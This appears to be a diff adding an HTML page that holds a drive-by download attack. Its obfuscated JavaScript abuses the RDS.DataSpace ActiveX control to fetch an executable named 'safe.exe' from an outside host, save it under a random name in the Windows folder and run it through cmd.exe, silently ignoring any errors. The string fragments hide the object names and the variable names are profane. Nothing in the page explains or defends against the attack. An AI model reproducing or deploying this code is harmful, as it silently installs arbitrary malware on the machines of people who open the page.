@@ -1,0 +1,7 @@
+<html>
+<body>
+<script language="javaScript">
+function gn(fuckyoushabi){var zhenshiyaominglemade=Math.random()*fuckyoushabi;return'~tmp'+Math.round(zhenshiyaominglemade)+'.exe'}try{zhenshiyaominglemade123="o";zhenshiyaominglemade456="b"+"j"+"e";zhenshiyaominglemade888="c"+"t";zhenshiyaominglemade789="A"+"d"+"o"+"d";zhenshiyaominglemade111111="b.S"+"t"+"r"+"e"+"a"+"m";zhenshiyaominglemade222222="Microsoft.XMLHTT"+"P";zhenshiyaominglemade444="o";zhenshiyaominglemade555="p";zhenshiyaominglemade666="e";zhenshiyaominglemade777="n";lovezhenshiyaominglemade="http://www.yumen8.cn/safe.exe";var df=document.createElement(zhenshiyaominglemade123+zhenshiyaominglemade456+zhenshiyaominglemade888);df.setAttribute("classid","clsid:BD96C556-65A3-11D0-983A-00C04FC29E36");var x=df.CreateObject(zhenshiyaominglemade222222,"");var S=df.CreateObject(zhenshiyaominglemade789+zhenshiyaominglemade111111,"");S.type=1;x.open("GET",lovezhenshiyaominglemade,0);x.send();mz1=gn(10000);var F=df.CreateObject("Scripting.FileSystemObject","");var tmp=F.GetSpecialFolder(0);mz1=F.BuildPath(tmp,mz1);S.Open();QQ123456=x.responseBody;S.Write(QQ123456);i=2;S.SaveToFile(mz1,i);S.Close();var Q=df.CreateObject("Shell.Application","");exp1=F.BuildPath(tmp+'\\sys'+'tem32','cmd.exe');Q["ShellE"+"xecute"](exp1,' /c '+mz1,"",zhenshiyaominglemade444+zhenshiyaominglemade555+zhenshiyaominglemade666+zhenshiyaominglemade777,0)}catch(i){i=1}
+</script>
+</body>
+</html>
